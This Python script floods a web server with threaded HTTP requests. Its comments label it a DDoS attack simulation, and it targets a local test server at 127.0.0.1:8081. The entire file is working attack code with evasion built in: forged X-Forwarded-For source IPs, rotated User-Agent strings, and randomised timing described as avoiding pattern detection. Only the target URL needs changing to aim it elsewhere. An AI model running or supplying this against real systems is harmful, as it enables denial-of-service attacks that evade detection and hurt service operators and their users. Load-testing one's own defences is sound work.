import threading
import requests
import random
import time

TARGET_URL = "http://127.0.0.1:8081"  

# Number of threads to simulate concurrent requests
NUM_THREADS = 50

# Number of requests per thread
REQUESTS_PER_THREAD = 50

# User-Agent pool to mimic different users
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "curl/7.68.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36",
]

# Random IP generator (for simulating different source IPs)
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Function to send a request
def send_request():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": random_ip(),  # Mimic real-world DDoS attack by changing IP
    }
    try:
        response = requests.get(TARGET_URL, headers=headers, timeout=3)
        print(f"Sent request: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Function to execute multiple requests in a thread
def attack():
    for _ in range(REQUESTS_PER_THREAD):
        send_request()
        time.sleep(random.uniform(0.1, 0.5))  # Add randomness to avoid pattern detection

# Main function to start the attack
def start_attack():
    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("Starting DDoS attack simulation...")
    start_attack()
